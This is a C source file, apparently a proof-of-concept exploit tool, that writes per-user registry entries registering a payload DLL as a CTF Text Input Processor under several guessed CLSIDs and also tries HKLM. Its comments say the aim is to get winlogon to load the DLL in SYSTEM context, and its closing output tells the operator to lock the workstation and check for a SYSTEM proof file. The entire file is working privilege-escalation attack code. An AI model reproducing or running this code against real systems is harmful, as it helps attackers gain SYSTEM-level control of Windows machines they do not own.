/*
 * reg_tip.c  —  Register payload.dll as a CTF Text Input Processor (TIP)
 *
 * When winlogon processes the Winlogon-desktop CTF session it reads TIP
 * registrations from the user's HKCU and loads them. If it loads them in
 * SYSTEM context (confused deputy), our DLL runs as SYSTEM.
 *
 * CTF TIP registry layout (HKCU):
 *   SOFTWARE\Microsoft\CTF\TIP\{CLSID}\
 *       Category\Category\{TF_CATEGORY_TIP}\{CLSID}   (empty)
 *   HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32  (DLL path)
 *   HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32  ThreadingModel = Apartment
 *
 * We also write the two GUIDs that winlogon put in our section, in case
 * the section GUIDs ARE the TIP CLSIDs winlogon expects to find loaded.
 *
 * BUILD:
 *   cl.exe reg_tip.c /nologo /O2 /D_CRT_SECURE_NO_WARNINGS ^
 *       /link advapi32.lib
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <string.h>

static BOOL WriteRegSZ(HKEY root, const wchar_t *path,
                        const wchar_t *val, const wchar_t *data) {
    HKEY hk;
    if (RegCreateKeyExW(root, path, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hk, NULL))
        return FALSE;
    BOOL ok = RegSetValueExW(hk, val, 0, REG_SZ,
        (BYTE*)data, (DWORD)((wcslen(data)+1)*sizeof(wchar_t))) == 0;
    RegCloseKey(hk);
    return ok;
}

static BOOL WriteRegEmpty(HKEY root, const wchar_t *path) {
    HKEY hk;
    BOOL ok = RegCreateKeyExW(root, path, 0, NULL, 0,
                              KEY_ALL_ACCESS, NULL, &hk, NULL) == 0;
    if (ok) RegCloseKey(hk);
    return ok;
}

int main(int argc, char **argv) {
    const char *dllPath = argc >= 2 ? argv[1] : "C:\\Temp\\payload.dll";
    wchar_t dllW[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, dllPath, -1, dllW, MAX_PATH);

    printf("[*] Registering CTF TIP: %s\n\n", dllPath);

    /* The two GUIDs winlogon wrote into our section —
       try registering both as TIPs so one of them matches. */
    const wchar_t *clsids[] = {
        L"{34745c63-b2f0-4784-8b67-5e12c8701a31}",  /* GUID1 from section */
        L"{03b5835f-f03c-411b-9ce2-aa23e1171e36}",  /* GUID2 from section */
        L"{d9936ca7-2355-904e-aafa-4db112f9ac76}",  /* data area GUID */
        NULL
    };

    /* TF_CATEGORY_TIP = {534C48FF-77BE-11D1-8F82-00C04FB66E2E} */
    /* TF_INPUTPROCESSORPROFILE_ATTR_... GUIDs */
    const wchar_t *catGuid  = L"{534C48FF-77BE-11D1-8F82-00C04FB66E2E}";
    const wchar_t *langGuid = L"{00000000-0000-0000-0000-000000000000}";

    int i;
    for (i = 0; clsids[i]; i++) {
        const wchar_t *clsid = clsids[i];
        wchar_t path[512];

        /* InProcServer32 — DLL path */
        swprintf(path, 511,
            L"SOFTWARE\\Classes\\CLSID\\%ls\\InProcServer32", clsid);
        if (WriteRegSZ(HKEY_CURRENT_USER, path, NULL, dllW) &&
            WriteRegSZ(HKEY_CURRENT_USER, path, L"ThreadingModel", L"Apartment"))
            printf("[+] HKCU\\...\\CLSID\\%ls\\InProcServer32 = %s\n", clsid, dllPath);
        else
            printf("[-] Failed CLSID\\%ls\n", clsid);

        /* CTF TIP category entry */
        swprintf(path, 511,
            L"SOFTWARE\\Microsoft\\CTF\\TIP\\%ls\\Category\\Category\\%ls\\%ls",
            clsid, catGuid, clsid);
        WriteRegEmpty(HKEY_CURRENT_USER, path);

        /* Language profile entry (0x0409 = English) */
        swprintf(path, 511,
            L"SOFTWARE\\Microsoft\\CTF\\TIP\\%ls\\LanguageProfile\\0x00000409\\%ls",
            clsid, langGuid);
        WriteRegEmpty(HKEY_CURRENT_USER, path);
        printf("[+] TIP registered: %ls\n", clsid);
    }

    /* Also register under HKLM\SOFTWARE\Classes if we have access */
    printf("\n[*] Trying HKLM registration (may fail without admin)...\n");
    for (i = 0; clsids[i]; i++) {
        wchar_t path[512];
        swprintf(path, 511,
            L"SOFTWARE\\Classes\\CLSID\\%ls\\InProcServer32", clsids[i]);
        if (WriteRegSZ(HKEY_LOCAL_MACHINE, path, NULL, dllW))
            printf("[+] HKLM CLSID\\%ls registered\n", clsids[i]);
        else
            printf("[-] HKLM CLSID\\%ls — access denied (expected)\n", clsids[i]);
    }

    printf("\n[*] Done. Now lock the workstation and check for SYSTEM_PROOF.txt\n");
    printf("[*] If winlogon loads TIPs from HKCU in SYSTEM context:\n");
    printf("    C:\\Temp\\SYSTEM_PROOF.txt will appear with SYSTEM identity\n");
    return 0;
}
